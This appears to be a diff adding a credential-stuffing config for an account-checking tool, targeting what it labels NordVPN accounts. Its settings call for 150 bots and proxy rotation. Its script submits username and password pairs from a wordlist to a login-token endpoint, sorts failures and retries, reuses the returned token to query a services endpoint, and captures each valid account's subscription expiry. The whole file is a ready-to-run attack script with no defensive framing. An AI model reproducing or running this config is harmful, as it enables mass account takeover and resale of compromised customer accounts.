@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Nordvpn",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-13T03:35:44.856035+02:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized" 
+  KEYCHAIN Retry OR 
+    KEY "502: Bad gateway" 
+#TOKEN PARSE "<SOURCE>" LR "\"token\":\"" "\"" -> VAR "TOKEN" 
+FUNCTION Base64Encode "token:<TOKEN>" -> VAR "ENCTOKEN" 
+REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic <ENCTOKEN>" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "created_at" 
+  KEYCHAIN Failure OR 
+    KEY "[]" 
+PARSE "<SOURCE>" LR "\",\"expires_at\":\"" "\"" -> CAP "EXPIRATION" "|" "|" 
